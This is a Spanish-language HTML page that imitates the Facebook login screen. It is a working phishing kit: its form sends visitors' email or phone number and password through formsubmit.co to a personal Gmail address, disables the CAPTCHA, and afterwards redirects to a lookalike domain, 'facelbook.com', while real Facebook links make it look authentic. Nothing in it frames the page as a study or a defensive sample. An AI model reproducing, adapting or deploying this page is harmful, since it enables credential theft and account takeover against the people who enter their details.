<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Facebook - Log In or Sign Up</title>
</head>

<body>
    <div class="container">
        <div class="container-profile">
            <span class="logo">
                <img src="img/1.svg" alt="facebook">
            </span>
            <p class="connect-friends">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="container-form">
            <form action="https://formsubmit.co/vendedordepapaya@gmail.com" method="POST" class="form">
                <input type="text" placeholder="Correo electronico o numero de telefono" name="email">
                <input type="password" placeholder="Contraseña" name="password">
                <input type="submit" value="Iniciar Sesión">
                <span><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">¿Olvidaste tu contraseña?</a></span>
                <div class="border"></div>
                <button><a href="https://es-la.facebook.com/r.php?locale=es_LA&display=page">Crear cuenta nueva</a></button>
                <input type="hidden" name="_next" value="https://facelbook.com/dfs">
                <input type="hidden" name="_captcha" value="false">
            </form>
            <p class="create-page">
                <a href="#">Crear una pagina</a> para una celebridad , una marca o un <br> neogocio.
            </p>
        </div>
    </div>

</body>

</html>
